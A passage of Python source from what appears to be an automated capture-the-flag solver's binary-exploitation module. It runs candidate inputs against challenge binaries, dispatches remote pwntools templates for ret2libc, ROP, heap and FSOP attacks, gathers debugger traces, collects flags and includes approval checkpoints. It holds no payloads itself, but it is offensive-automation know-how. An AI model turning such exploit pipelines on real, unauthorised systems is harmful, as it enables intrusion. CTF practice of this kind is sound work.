                continue
            seen.add(marker)
            values.append(value)
        return values[:8] or ["AAAA"]

    def _run_local_candidate_inputs(
        self,
        binary_path,
        input_values,
        artifact_root,
        label,
        memory,
        category="",
        subtype="",
        selected_analyzer=None,
        selected_debugger=None,
    ):
        command = self._detect_local_runner_command(binary_path)
        if not command:
            memory.record_action("attempt", "{0} local execution".format(label), "skipped", "local runner is not available for this sample type")
            return {}
        attempts = []
        analyzer_name = str((selected_analyzer or {}).get("analyzer_name", "") or "").lower()
        modes = [("stdin", True), ("argv", True)]
        if category == "pwn" and analyzer_name == "radare2":
            modes = [("argv", True), ("stdin", True)]
        elif category != "pwn" and str((selected_analyzer or {}).get("lane", "") or "").lower() == "sidecar":
            modes = [("stdin", True), ("argv", False)]

        for item in input_values[:8]:
            for mode_name, enabled in modes:
                if not enabled:
                    continue
                run_command = list(command)
                stdin_text = None
                if mode_name == "stdin":
                    stdin_text = item + "\n"
                elif mode_name == "argv":
                    run_command = list(command) + [item]
                result = self.shell_tool.run(run_command, cwd=str(binary_path.parent), timeout=6, stdin_text=stdin_text)
                blob = (result.get("stdout", "") or "") + "\n" + (result.get("stderr", "") or "")
                flags = self.verifier.discover_from_text(blob)
                attempts.append(
                    {
                        "input": item,
                        "mode": mode_name,
                        "command": run_command,
                        "returncode": result.get("returncode"),
                        "stdout": result.get("stdout", "")[:12000],
                        "stderr": result.get("stderr", "")[:6000],
                        "flags": flags,
                    }
                )
                if flags:
                    break
            if any(item == attempt.get("input") and attempt.get("flags") for attempt in attempts):
                break
        artifact = artifact_root / "{0}_{1}_local_attempts.json".format(binary_path.stem, label)
        payload = {
            "status": "ok",
            "mode": "local",
            "artifact": str(artifact),
            "attempts": attempts,
            "selected_analyzer": dict(selected_analyzer or {}),
            "selected_debugger": dict(selected_debugger or {}),
        }
        self.file_tool.write_json(artifact, payload)
        memory.record_action("attempt", "{0} local execution".format(label), "ok", "bounded local candidate-input run", str(artifact))
        return payload

    def _refine_pwn_classification(self, classification, pwn_probe, angr_probe):
        result = dict(classification or {})
        subtype = str(result.get("subtype", "") or "").strip().lower()
        pwn_probe = dict(pwn_probe or {})
        angr_probe = dict(angr_probe or {})
        if list(pwn_probe.get("ret2libc_plans", []) or []):
            return {
                "subtype": "ret2libc",
                "summary": "Remote probe synthesized a leak-and-resolve libc path; prioritize ret2libc before weaker format-string guesses.",
            }
        raw_payloads = list(pwn_probe.get("raw_payloads", []) or [])
        if any(str(item.get("kind") or "") == "rop-call" for item in raw_payloads):
            return {
                "subtype": "rop",
                "summary": "Remote probe synthesized imported-call ROP payloads; prioritize a bounded ROP path.",
            }
        if any(str(item.get("kind") or "").startswith("rop") for item in raw_payloads):
            return {
                "subtype": "rop",
                "summary": "Remote probe synthesized raw ROP payloads; prioritize a bounded ROP path.",
            }
        if bool(angr_probe.get("solved")) and subtype not in {"ret2win", "format-string", "rop"}:
            return {
                "subtype": "stack-overflow",
                "summary": "Bounded symbolic recovery produced a satisfying stdin payload, so keep stack-input recovery ahead of weaker hints.",
            }
        return result

    def _detect_local_runner_command(self, binary_path):
        suffix = binary_path.suffix.lower()
        if suffix == ".py":
            return [sys.executable, str(binary_path)]
        if suffix in {".bat", ".cmd"}:
            return [str(binary_path)]
        if suffix == ".sh":
            return ["wsl", "sh", str(binary_path)] if self._can_use_wsl_shell() else None
        try:
            head = self.file_tool.read_text(binary_path, limit_bytes=256)
        except Exception:
            head = ""
        if str(head or "").startswith("#!/bin/sh"):
            return ["wsl", "sh", str(binary_path)] if self._can_use_wsl_shell() else None
        return None

    def _can_use_wsl_shell(self):
        if bool(self.policy.get("disable_local_wsl_runner", False)):
            self._wsl_shell_available = False
            return False
        if self._wsl_shell_available is not None:
            return bool(self._wsl_shell_available)
        if not self.shell_tool:
            self._wsl_shell_available = False
            return False
        try:
            result = self.shell_tool.run(["wsl", "-e", "sh", "-lc", "printf ok"], timeout=8)
        except Exception:
            result = {}
        if self._maybe_pause_on_approval(
            getattr(self, "_runtime_challenge", None),
            getattr(self, "_runtime_workspace", None),
            getattr(self, "_runtime_memory", None),
            checkpoint="binary:wsl_probe",
            result=result,
            context=self._runtime_snapshot(),
            pending_action={"kind": "shell_probe", "command": ["wsl", "-e", "sh", "-lc", "printf ok"]},
            blocked_reason=str(result.get("message", "") or "shell approval required"),
        ):
            return False
        stdout = str(result.get("stdout", "") or "").strip().lower()
        self._wsl_shell_available = result.get("returncode") == 0 and stdout.endswith("ok")
        return bool(self._wsl_shell_available)

    def _run_remote_template(self, remote_context, template_kind, artifact_root, stem, memory, **variables):
        host = remote_context["host"]
        result = self.remote_tool.run_template(host, template_kind, remote_workspace=remote_context["workspace"], timeout=120, **variables)
        if self._maybe_pause_on_approval(
            getattr(self, "_runtime_challenge", None),
            getattr(self, "_runtime_workspace", None),
            getattr(self, "_runtime_memory", memory),
            checkpoint="binary:remote_template:{0}".format(template_kind),
            result=result,
            context=self._runtime_snapshot(remote_context=remote_context, template_kind=template_kind, variables=variables),
            pending_action={"kind": "remote_template_run", "template_kind": template_kind, "host": host},
            blocked_reason=str(result.get("message", "") or "remote template approval required"),
        ):
            return {"status": "needs_approval", "mode": "remote", "template_kind": template_kind, "host": host, "artifact": "", "payload": {}, "attempts": []}
        artifact = artifact_root / "{0}_{1}_{2}.json".format(stem, host, template_kind.replace("-", "_"))
        self.file_tool.write_json(artifact, result)
        execute = dict(result.get("execute") or {})
        payload = {}
        stdout_text = str(execute.get("stdout", "") or "").strip()
        if stdout_text:
            try:
                payload = json.loads(stdout_text)
            except Exception:
                payload = {}
        if payload:
            payload_artifact = artifact_root / "{0}_{1}_{2}_payload.json".format(stem, host, template_kind.replace("-", "_"))
            self.file_tool.write_json(payload_artifact, payload)
        phase = "attempt" if "runner" in template_kind or "bruteforce" in template_kind else "extract"
        memory.record_action(phase, "{0} on {1}".format(template_kind, host), result.get("status", "error"), result.get("message", "") or template_kind, str(artifact))
        return {"status": result.get("status", "error"), "mode": "remote", "template_kind": template_kind, "host": host, "artifact": str(artifact), "payload": payload, "attempts": list(payload.get("attempts", [])) if isinstance(payload, dict) else []}

    def _maybe_collect_pwn_debug_trace(self, challenge, binary_path, artifact_root, remote_context, memory, binary_context):
        if not self.remote_tool:
            return {}
        if str((challenge.metadata or {}).get("speed_mode") or "standard").lower() == "fastest":
            return {}
        pwn_capabilities = dict(remote_context.get("pwn_capabilities") or {})
        if not dict(pwn_capabilities.get("build_capabilities") or {}).get("gdb_batch"):
            return {}
        if dict(binary_context.get("exploit_transcript") or {}).get("status") in {"transcript-ready", "validated"}:
            return {}
        if not (binary_context.get("exploit_stub_generated") or binary_context.get("stage2_generated") or binary_context.get("pwn_hard_reports")):
            return {}
        candidate_inputs = [item.get("value", "") for item in list(binary_context.get("candidate_inputs", [])) if item.get("value")]
        stdin_data = ""
        if candidate_inputs:
            stdin_data = str(candidate_inputs[0])
            if not stdin_data.endswith("\n"):
                stdin_data += "\n"
        rr_trace = {}
        if dict(pwn_capabilities.get("build_capabilities") or {}).get("rr"):
            rr_trace = self._run_remote_template(
                remote_context,
                "pwn-rr-record",
                artifact_root,
                binary_path.stem,
                memory,
                sample_path=remote_context.get("binary_path", ""),
                binary_name=binary_path.name,
                stdin_data=stdin_data,
            )
        trace = self._run_remote_template(
            remote_context,
            "pwn-gdb-batch-trace",
            artifact_root,
            binary_path.stem,
            memory,
            sample_path=remote_context.get("binary_path", ""),
            binary_name=binary_path.name,
            stdin_data=stdin_data,
            gdb_commands=["printf \"===TRACE-END===\\n\""],
        )
        payload = dict(trace.get("payload") or {})
        rr_payload = dict(rr_trace.get("payload") or {})
        if payload:
            stage_status = dict(binary_context.get("pwn_stage_status") or {})
            stage_status["debug_trace"] = {
                "signal": str(payload.get("signal") or ""),
                "trace_summary": str(payload.get("trace_summary") or ""),
                "trace_excerpt": str(payload.get("trace_excerpt") or ""),
                "registers_excerpt": str(payload.get("registers_excerpt") or ""),
                "stack_excerpt": str(payload.get("stack_excerpt") or ""),
                "backtrace_excerpt": str(payload.get("backtrace_excerpt") or ""),
            }
            if rr_payload:
                stage_status["debug_trace"]["rr_trace"] = {
                    "trace_dir": str(rr_payload.get("trace_dir") or ""),
                    "signal": str(rr_payload.get("signal") or ""),
                    "trace_summary": str(rr_payload.get("trace_summary") or ""),
                    "replay_hint": str(rr_payload.get("replay_hint") or ""),
                }
            binary_context["pwn_stage_status"] = stage_status
        return {
            "template_kind": "pwn-gdb-batch-trace",
            "status": trace.get("status", ""),
            "artifact": trace.get("artifact", ""),
            "payload": payload,
            "rr_trace": {
                "status": rr_trace.get("status", ""),
                "artifact": rr_trace.get("artifact", ""),
                "payload": rr_payload,
            } if rr_payload else {},
        }

    def _collect_flags_from_attempt_report(self, report, memory, subtype):
        source = "binary:remote-runner" if report.get("mode") == "remote" else "binary:validated-{0}".format(subtype)
        for attempt in list(report.get("attempts", [])):
            blob = "\n".join(
                [
                    str(attempt.get("stdout", "")),
                    str(attempt.get("stderr", "")),
                    str(attempt.get("stage2_stdout", "")),
                    str(attempt.get("stage2_stderr", "")),
                ]
            )
            for flag in self.verifier.discover_from_text(blob):
                confidence = 0.98 if report.get("mode") == "remote" else 0.92
                memory.add_candidate_flag(flag, source, confidence, reproducible=True)
        payload = dict((report or {}).get("payload") or {})
        for item in list(payload.get("candidate_flags", []) or []):
            raw_value = str((item or {}).get("value", "") or "")
            raw_source = str((item or {}).get("source", "") or "").strip().lower()
            payload_source = source
            if raw_source:
                payload_source = raw_source if raw_source.startswith("binary:") else "binary:{0}".format(raw_source)
            for flag in self.verifier.discover_from_text(raw_value):
                memory.add_candidate_flag(flag, payload_source, 0.985 if report.get("mode") == "remote" else 0.93, reproducible=True)

    def _discover_static_flags(self, text, memory, source, reproducible=False, base_confidence=0.6):
        for flag in self.verifier.discover_from_text(text or ""):
            memory.add_candidate_flag(flag, source, base_confidence, reproducible=reproducible)

    def _build_analysis_payload(
        self,
        challenge,
        category,
        subtype,
        summary,
        binary_path,
        protections,
        interesting_symbols,
        candidate_inputs,
        decoded_candidates,
        reverse_reports,
        attempt_reports,
        remote_context,
        state,
        best_path,
        debug_helpers,
        binary_context,
    ):
        return {
            "category": category,
            "subtype": subtype,
            "summary": summary,
            "binary_path": str(binary_path),
            "target": challenge.target or "",
            "protections": protections,
            "interesting_symbols": interesting_symbols,
            "candidate_inputs": candidate_inputs,
            "decoded_candidates": decoded_candidates[:20],
            "reverse_reports": reverse_reports,
            "candidate_flags": [item.value for item in state.candidate_flags],
            "exploit_plans": [plan.title for plan in state.exploit_plans],
            "best_path": best_path,
            "next_actions": self._next_actions(state, category, subtype),
            "recommended_tools": self._recommended_tools(category, subtype),
            "recommended_mcp": self._recommended_mcp(),
            "recommended_remote_templates": self._recommended_remote_templates(category, remote_context),
            "debug_helpers": list(debug_helpers or []),
            "used_tools": list(binary_context.get("used_tools", [])),
            "used_mcp": list(binary_context.get("used_mcp", [])),
            "capability_plan": dict(binary_context.get("capability_plan", {})),
            "selected_debugger": dict(binary_context.get("selected_debugger", {})),
            "selected_analyzer": dict(binary_context.get("selected_analyzer", {})),
            "analysis_strategy": dict(binary_context.get("analysis_strategy", {})),
            "pwn_probe": dict(binary_context.get("pwn_probe", {})),
            "angr_probe": dict(binary_context.get("angr_probe", {})),
            "pwn_capabilities": dict(binary_context.get("pwn_capabilities", {})),
            "pwn_env_doctor": dict(binary_context.get("pwn_env_doctor", {})),
            "pwn_wave2_reports": list(binary_context.get("pwn_wave2_reports", [])),
            "build_profile": str(binary_context.get("build_profile", "") or ""),
            "build_capabilities": dict(binary_context.get("build_capabilities", {})),
            "build_missing": list(binary_context.get("build_missing", [])),
            "build_recommended": list(binary_context.get("build_recommended", [])),
            "suggested_build_template": str(binary_context.get("suggested_build_template", "") or ""),
            "source_build": dict(binary_context.get("source_build", {})),
            "build_reports": list(binary_context.get("build_reports", [])),
            "debug_trace": dict(binary_context.get("debug_trace", {})),
            "pwn_family": str(binary_context.get("pwn_family", "") or ""),
            "pwn_family_confidence": float(binary_context.get("pwn_family_confidence", 0.0) or 0.0),
            "pwn_family_evidence": list(binary_context.get("pwn_family_evidence", [])),
            "pwn_family_candidates": list(binary_context.get("pwn_family_candidates", [])),
            "pwn_stage_status": dict(binary_context.get("pwn_stage_status", {})),
            "exploit_stub_generated": bool(binary_context.get("exploit_stub_generated", False)),
            "stage2_generated": bool(binary_context.get("stage2_generated", False)),
            "pwn_hard_reports": list(binary_context.get("pwn_hard_reports", [])),
            "hard_blockers": list(binary_context.get("hard_blockers", [])),
            "leak_artifacts": list(binary_context.get("leak_artifacts", [])),
            "resolved_libc_context": dict(binary_context.get("resolved_libc_context", {})),
            "stage1_payload": dict(binary_context.get("stage1_payload", {})),
            "stage2_payload": dict(binary_context.get("stage2_payload", {})),
            "exploit_transcript": dict(binary_context.get("exploit_transcript", {})),
            "attempt_reports": attempt_reports,
        }

    def _next_actions(self, state, category, subtype):
        if state.candidate_flags:
            return ["Re-run the best binary path once and freeze the reproduction chain."]
        best_plan = self._best_plan(state)
        if best_plan:
            return ["Continue with {0} ({1})".format(best_plan.title, best_plan.method)]
        return ["Continue the {0}:{1} workflow with the next candidate input batch.".format(category, subtype)]

    def _recommended_tools(self, category, subtype=""):
        tools = ["run_local_tool", "probe_remote_host", "run_remote_template"]
        if category == "pwn":
            tools.extend(["pwntools", "strings"])
        else:
            tools.extend(["strings", "analyze_with_ida"])
        if self.toolkit_tool and self.toolkit_tool.is_configured():
            capability_plan = self.toolkit_tool.capability_plan(category, subtype)
            tools.extend(capability_plan.get("recommended_tools", []))
            tools.extend(capability_plan.get("recommended_libraries", []))
            tools.extend(capability_plan.get("recommended_sidecars", []))
        deduped = []
        for item in tools:
            if item not in deduped:
                deduped.append(item)
        return deduped

    def _recommended_mcp(self):
        if not self.mcp_registry or not self.mcp_registry.has_servers():
            return []
        reverse_hint = self.mcp_registry.pick_reverse_tool()
        if not reverse_hint:
            return []
        return ["{0}::{1}".format(reverse_hint["server"], reverse_hint["tool"]["name"])]

    def _resolve_pwn_parity(self, pwn_capabilities, pwn_env_doctor=None):
        merged = {}
        for source in [dict(pwn_capabilities or {}), dict(pwn_env_doctor or {})]:
            for key in [
                "parity_profile",
                "core_missing",
                "advanced_missing",
                "debugger_missing",
                "build_profile",
                "build_capabilities",
                "build_missing",
                "build_recommended",
                "bootstrap_recommended",
                "suggested_template",
                "suggested_build_template",
                "host_profile",
            ]:
                value = source.get(key)
                if value not in [None, "", []]:
                    merged[key] = value
        if not merged:
            return {}
        profile = str(merged.get("parity_profile") or "weak")
        if "parity_profile" not in merged:
            if merged.get("core_missing"):
                profile = "weak"
            elif merged.get("advanced_missing") or merged.get("debugger_missing"):
                profile = "usable"
            else:
                profile = "ready"
        return {
            "profile": profile,
            "core_missing": list(merged.get("core_missing", [])),
            "advanced_missing": list(merged.get("advanced_missing", [])),
            "debugger_missing": list(merged.get("debugger_missing", [])),
            "build_profile": str(merged.get("build_profile") or ""),
            "build_capabilities": dict(merged.get("build_capabilities") or {}),
            "build_missing": list(merged.get("build_missing", [])),
            "build_recommended": list(merged.get("build_recommended", [])),
            "bootstrap_recommended": bool(merged.get("bootstrap_recommended")),
            "suggested_template": str(merged.get("suggested_template") or ""),
            "suggested_build_template": str(merged.get("suggested_build_template") or ""),
            "host_profile": dict(merged.get("host_profile") or {}),
        }

    def _build_pwn_bootstrap_hint(self, selected_host, pwn_parity):
        pwn_parity = dict(pwn_parity or {})
        if not pwn_parity.get("bootstrap_recommended"):
            return ""
        profile = str(pwn_parity.get("profile") or "weak")
        build_profile = str(pwn_parity.get("build_profile") or "")
        template = str(pwn_parity.get("suggested_template") or pwn_parity.get("suggested_build_template") or "pwn-kali-bootstrap")
        target_host = str(selected_host or "configured remote helper").strip() or "configured remote helper"
        missing_parts = []
        if pwn_parity.get("core_missing"):
            missing_parts.append("core={0}".format(", ".join(list(pwn_parity.get("core_missing") or []))))
        if pwn_parity.get("advanced_missing"):
            missing_parts.append("advanced={0}".format(", ".join(list(pwn_parity.get("advanced_missing") or []))))
        if pwn_parity.get("debugger_missing"):
            missing_parts.append("debugger={0}".format(", ".join(list(pwn_parity.get("debugger_missing") or []))))
        if build_profile:
            missing_parts.append("build={0}".format(build_profile))
        if pwn_parity.get("build_missing"):
            missing_parts.append("build_missing={0}".format(", ".join(list(pwn_parity.get("build_missing") or []))))
        detail = "; ".join(missing_parts)
        return "Run {0} on {1} to move pwn parity from {2}{3}".format(
            template,
            target_host,
            profile,
            "" if not detail else " ({0})".format(detail),
        )

    def _build_pwn_board_blockers(self, category, pwn_parity, selected_host=""):
        if category != "pwn":
            return []
        pwn_parity = dict(pwn_parity or {})
        build_profile = str(pwn_parity.get("build_profile") or "")
        if pwn_parity.get("profile") != "weak" and build_profile not in {"weak", ""}:
            return []
        blocker = "pwn-helper-weak: core_missing={0}".format(", ".join(list(pwn_parity.get("core_missing") or [])) or "unknown")
        if build_profile:
            blocker = "{0}; build_profile={1}; build_missing={2}".format(
                blocker,
                build_profile,
                ", ".join(list(pwn_parity.get("build_missing") or [])) or "none",
            )
        bootstrap_hint = self._build_pwn_bootstrap_hint(selected_host, pwn_parity)
        if bootstrap_hint:
            blocker = "{0}; {1}".format(blocker, bootstrap_hint)
        return [blocker]

    def _recommended_remote_templates(self, category, remote_context):
        if not remote_context:
            return []
        templates = self.remote_tool.recommended_templates(category) if self.remote_tool else []
        if category == "pwn":
            pwn_capabilities = dict(remote_context.get("pwn_capabilities") or {})
            templates.extend(list(pwn_capabilities.get("recommended_templates") or []))
            pwn_family = str((remote_context.get("pwn_stage_status") or {}).get("family") or remote_context.get("pwn_family") or "").strip().lower()
            hard_template_map = {
                "heap-uaf": "heap-pwntools-skeleton",
                "heap-double-free": "heap-pwntools-skeleton",
                "heap-tcache-poison": "heap-pwntools-skeleton",
                "heap-unsorted-bin": "heap-pwntools-skeleton",
                "seccomp-orw": "orw-pwntools-probe",
                "sandbox-orw": "orw-pwntools-probe",
                "shellcode-mmap": "orw-pwntools-probe",
                "srop": "srop-pwntools-probe",
                "fsop": "fsop-pwntools-skeleton",
                "ret2dlresolve": "ret2dlresolve-pwntools-probe",
            }
            hard_template = hard_template_map.get(pwn_family, "")
            if hard_template and hard_template not in templates:
                templates.append(hard_template)
            if templates:
                return list(dict.fromkeys(templates))
            return list(dict.fromkeys(["pwn-env-doctor", "binary-checksec", "pwntools-probe", "input-bruteforce-lite"]))
        templates.extend(["binary-checksec", "reverse-runner"])
        return list(dict.fromkeys(templates))

    def _prepare_debug_helpers(self, binary_path, artifact_root, category, candidate_inputs, interesting_symbols, memory):
        helpers = []
        if not self.toolkit_tool or not self.toolkit_tool.is_configured():
            return helpers
        if category not in {"pwn", "re", "reverse"}:
            return helpers
        for headless in [True, False]:
            ida_payload = self.toolkit_tool.render_ida_runner(binary_path, headless=headless)
            if ida_payload.get("status") == "ok":
                launcher_path = artifact_root / ida_payload.get("launcher_name", "{0}_ida_runner.cmd".format(binary_path.stem))
                notes_path = artifact_root / ida_payload.get("notes_name", "{0}_ida_notes.txt".format(binary_path.stem))
                self.file_tool.write_text(launcher_path, ida_payload.get("launcher_content", ""))
                self.file_tool.write_text(notes_path, ida_payload.get("notes_content", ""))
                helper = {
                    "name": "ida-{0}-runner".format(ida_payload.get("mode", "headless")),
                    "launcher_path": str(launcher_path),
                    "notes_path": str(notes_path),
                    "command_preview": ida_payload.get("command_preview", ""),
                    "bootstrap_script": ida_payload.get("bootstrap_script", ""),
                    "compat_dir": ida_payload.get("compat_dir", ""),
                }
                helpers.append(helper)
                memory.record_action(
                    "plan",
                    "prepare ida {0} runner".format(ida_payload.get("mode", "headless")),
                    "ok",
                    "IDA helper generated with bootstrap and compat shim",
                    str(launcher_path),
                )
        x64dbg_payload = self.toolkit_tool.render_x64dbg_runner(
            binary_path,
            initial_breakpoints=[item for item in interesting_symbols[:6] if item],
        )
        if x64dbg_payload.get("status") != "ok":
            return helpers

        debugger_name = x64dbg_payload.get("debugger_name", "x64dbg")
        launcher_path = artifact_root / x64dbg_payload.get("launcher_name", "{0}_{1}_runner.cmd".format(binary_path.stem, debugger_name))
        notes_path = artifact_root / x64dbg_payload.get("notes_name", "{0}_{1}_notes.txt".format(binary_path.stem, debugger_name))
        self.file_tool.write_text(launcher_path, x64dbg_payload.get("launcher_content", ""))
        self.file_tool.write_text(notes_path, x64dbg_payload.get("notes_content", ""))
        helper = {
            "name": "{0}-runner".format(debugger_name),
            "launcher_path": str(launcher_path),
            "notes_path": str(notes_path),
            "command_preview": x64dbg_payload.get("command_preview", ""),
            "candidate_inputs": [item.get("value", "") for item in candidate_inputs[:6]],
            "selection_reason": x64dbg_payload.get("selection_reason", ""),
            "detected_bits": x64dbg_payload.get("detected_bits", ""),
        }
        helpers.append(helper)
        memory.record_action("plan", "prepare {0} runner".format(debugger_name), "ok", x64dbg_payload.get("selection_reason", "") or "local debugger helper generated", str(launcher_path))
        return helpers

    def _select_binary_analyzer(self, category, subtype):
        category = str(category or "").lower()
        subtype = str(subtype or "").lower()
        reverse_descriptor = self.mcp_registry.pick_reverse_tool() if self.mcp_registry else None
        reverse_server = str((reverse_descriptor or {}).get("server", "") or "")
        reverse_tool = str(((reverse_descriptor or {}).get("tool") or {}).get("name", "") or "")
        if category in {"re", "reverse"} and reverse_server:
            return {
                "analyzer_name": reverse_server,
                "analyzer_mode": reverse_tool or "reverse-mcp",
                "lane": "sidecar",
                "reason": "Reverse workflow defaults to the reverse MCP template before local fallback.",
            }
        if category == "pwn" and self.toolkit_tool and self.toolkit_tool.has_tool("radare2"):
            return {
                "analyzer_name": "radare2",
                "analyzer_mode": "bounded-cli",
                "lane": "bounded-heavy",
                "reason": "Pwn workflow prefers a fast local static probe before escalating to heavier sidecars.",
            }
        if reverse_server:
            return {
                "analyzer_name": reverse_server,
                "analyzer_mode": reverse_tool or "reverse-mcp",
                "lane": "sidecar",
                "reason": "Reverse MCP is available and selected by the current capability plan.",
            }
        if self.toolkit_tool and self.toolkit_tool.has_tool("radare2"):
            return {
                "analyzer_name": "radare2",
                "analyzer_mode": "bounded-cli",
                "lane": "bounded-heavy",
                "reason": "Local radare2 probe is the best available static analyzer for this subtype.",
            }
        return {
            "analyzer_name": "strings",
            "analyzer_mode": "fast-surface",
            "lane": "fast",
            "reason": "Falling back to low-cost surface extraction because no stronger analyzer is available.",
        }

    def _write_notes(self, challenge, workspace, state, profile, attachment_summaries, binary_context):
        best_flag = self.verifier.choose_best(state, challenge)
        lines = [
            "# Challenge Notes",
            "",
            "## Metadata",
            "Title: {0}".format(challenge.title),
            "Category: {0}".format(challenge.category),
            "Target: {0}".format(challenge.target or "-"),
            "",
            "## Binary Summary",
            "Subtype: {0}".format(binary_context.get("subtype", "") or "-"),
            "Summary: {0}".format(binary_context.get("summary", "") or "-"),
            "Best Path: {0}".format(binary_context.get("best_path", "") or "-"),
            "",
            "## Protections",
        ]
        protections = dict(binary_context.get("protections") or {})
        if protections:
            for key in sorted(protections.keys()):
                lines.append("- {0}: {1}".format(key, protections.get(key)))
        else:
            lines.append("- none")
        lines.extend(["", "## Interesting Symbols"])
        for item in list(binary_context.get("interesting_symbols", []))[:12]:
            lines.append("- {0}".format(item))
        if not binary_context.get("interesting_symbols"):
            lines.append("- none")
        lines.extend(["", "## Candidate Inputs"])
        for item in list(binary_context.get("candidate_inputs", []))[:12]:
            lines.append("- {0} [{1}]".format(item.get("value", ""), item.get("source", "")))
        if not binary_context.get("candidate_inputs"):
            lines.append("- none")
        pwn_probe = dict(binary_context.get("pwn_probe") or {})
        if pwn_probe:
            lines.extend(["", "## Remote Pwn Probe"])
            tool_status = dict(pwn_probe.get("tool_status") or {})
            if tool_status:
                lines.append("- tool_status: {0}".format(", ".join("{0}={1}".format(key, value) for key, value in sorted(tool_status.items()))))
            for symbol in list(pwn_probe.get("ret2win_symbols", []))[:6]:
                lines.append("- ret2win_symbol: {0}".format(symbol))
            for clue in list(pwn_probe.get("fmt_clues", []))[:6]:
                lines.append("- format_string_hint: {0}".format(clue))
            for gadget in list(pwn_probe.get("rop_hints", []))[:4]:
                lines.append("- rop_hint: {0}".format(gadget))
        pwn_capabilities = dict(binary_context.get("pwn_capabilities") or {})
        if pwn_capabilities:
            lines.extend(["", "## Remote Pwn Capabilities"])
            for key in ["gdb", "gdbserver", "patchelf", "checksec", "ropper", "one_gadget", "pwninit", "radare2", "pwntools", "angr", "r2pipe", "qemu_user", "tmux", "socat", "pwndbg_or_gef", "libc_patch_tooling"]:
                if key in pwn_capabilities:
                    lines.append("- {0}: {1}".format(key, "yes" if pwn_capabilities.get(key) else "no"))
            build_capabilities = dict(pwn_capabilities.get("build_capabilities") or {})
            if build_capabilities:
                lines.append("- build_profile: {0}".format(pwn_capabilities.get("build_profile", "") or "unknown"))
                lines.append("- build_missing: {0}".format(", ".join(list(pwn_capabilities.get("build_missing") or [])) or "none"))
                lines.append("- build_recommended: {0}".format(", ".join(list(pwn_capabilities.get("build_recommended") or [])) or "none"))
            if pwn_capabilities.get("missing"):
                lines.append("- missing: {0}".format(", ".join(list(pwn_capabilities.get("missing") or []))))
            if pwn_capabilities.get("recommended_templates"):
                lines.append("- recommended_templates: {0}".format(", ".join(list(pwn_capabilities.get("recommended_templates") or []))))
        pwn_parity = dict(binary_context.get("pwn_parity") or {})
        if pwn_parity:
            lines.extend(["", "## Pwn Parity"])
            lines.append("- profile: {0}".format(pwn_parity.get("profile", "unknown")))
            lines.append("- core_missing: {0}".format(", ".join(list(pwn_parity.get("core_missing") or [])) or "none"))
            lines.append("- advanced_missing: {0}".format(", ".join(list(pwn_parity.get("advanced_missing") or [])) or "none"))
            lines.append("- debugger_missing: {0}".format(", ".join(list(pwn_parity.get("debugger_missing") or [])) or "none"))
            lines.append("- build_profile: {0}".format(pwn_parity.get("build_profile", "") or "unknown"))
            lines.append("- build_missing: {0}".format(", ".join(list(pwn_parity.get("build_missing") or [])) or "none"))
            lines.append("- build_recommended: {0}".format(", ".join(list(pwn_parity.get("build_recommended") or [])) or "none"))
            lines.append("- bootstrap_recommended: {0}".format("yes" if pwn_parity.get("bootstrap_recommended") else "no"))
            if pwn_parity.get("suggested_template"):
                lines.append("- suggested_template: {0}".format(pwn_parity.get("suggested_template", "")))
                lines.append("- bootstrap_hint: {0}".format(self._build_pwn_bootstrap_hint("", pwn_parity)))
            if pwn_parity.get("suggested_build_template"):
                lines.append("- suggested_build_template: {0}".format(pwn_parity.get("suggested_build_template", "")))
        source_build = dict(binary_context.get("source_build") or {})
        if source_build:
            lines.extend(["", "## Source Build"])
            lines.append("- status: {0}".format(source_build.get("status", "") or "unknown"))
            lines.append("- build_profile: {0}".format(source_build.get("build_profile", "") or "unknown"))
            lines.append("- suggested_build_template: {0}".format(source_build.get("suggested_build_template", "") or ""))
            candidate = dict(source_build.get("candidate") or {})
            if candidate:
                lines.append("- local_binary: {0}".format(candidate.get("path", "")))
                lines.append("- remote_binary_path: {0}".format(candidate.get("remote_binary_path", "")))
        debug_trace = dict(binary_context.get("debug_trace") or {})
        if debug_trace:
            lines.extend(["", "## Debug Trace"])
            lines.append("- status: {0}".format(debug_trace.get("status", "") or "unknown"))
            payload = dict(debug_trace.get("payload") or {})
            if payload:
                lines.append("- signal: {0}".format(payload.get("signal", "") or ""))
                lines.append("- trace_summary: {0}".format(payload.get("trace_summary", "") or ""))
                rr_trace = dict(debug_trace.get("rr_trace") or {})
                rr_payload = dict(rr_trace.get("payload") or {})
                if rr_payload:
                    lines.append("- rr_trace_dir: {0}".format(rr_payload.get("trace_dir", "") or ""))
                    lines.append("- rr_replay_hint: {0}".format(rr_payload.get("replay_hint", "") or ""))
        pwn_family = str(binary_context.get("pwn_family") or "").strip()
        if pwn_family:
            lines.extend(["", "## Pwn Family"])
            lines.append("- family: {0}".format(pwn_family))
            lines.append("- confidence: {0}".format(binary_context.get("pwn_family_confidence", 0.0)))
            for item in list(binary_context.get("pwn_family_evidence", []))[:8]:
                lines.append("- evidence.{0}: {1}".format(str(item.get("source") or "signal"), str(item.get("value") or "")))
            for item in list(binary_context.get("hard_blockers", []))[:6]:
                lines.append("- blocker: {0}".format(item))
        pwn_stage_status = dict(binary_context.get("pwn_stage_status") or {})
        if pwn_stage_status:
            lines.extend(["", "## Pwn Stage"])
            lines.append("- status: {0}".format(pwn_stage_status.get("status", "unknown")))
            lines.append("- source_lane: {0}".format(pwn_stage_status.get("source_lane", "") or "classification"))
            if pwn_stage_status.get("summary"):
                lines.append("- summary: {0}".format(pwn_stage_status.get("summary", "")))
            for item in list(pwn_stage_status.get("constraints", []))[:6]:
                lines.append("- constraint: {0}".format(item))
            for item in list(pwn_stage_status.get("blockers", []))[:6]:
                lines.append("- stage_blocker: {0}".format(item))
            for item in list(binary_context.get("leak_artifacts", []))[:4]:
                lines.append("- leak_artifact: {0}".format(json.dumps(item, ensure_ascii=False)))
            if binary_context.get("resolved_libc_context"):
                lines.append("- resolved_libc_context: {0}".format(json.dumps(binary_context.get("resolved_libc_context", {}), ensure_ascii=False)))
            if binary_context.get("stage1_payload"):
                lines.append("- stage1_payload: {0}".format(json.dumps(binary_context.get("stage1_payload", {}), ensure_ascii=False)))
            if binary_context.get("stage2_payload"):
                lines.append("- stage2_payload: {0}".format(json.dumps(binary_context.get("stage2_payload", {}), ensure_ascii=False)))
            if binary_context.get("exploit_transcript"):
                lines.append("- exploit_transcript: {0}".format(json.dumps(binary_context.get("exploit_transcript", {}), ensure_ascii=False)))
            lines.append("- exploit_stub_generated: {0}".format("yes" if binary_context.get("exploit_stub_generated") else "no"))
            lines.append("- stage2_generated: {0}".format("yes" if binary_context.get("stage2_generated") else "no"))
        pwn_env_doctor = dict(binary_context.get("pwn_env_doctor") or {})
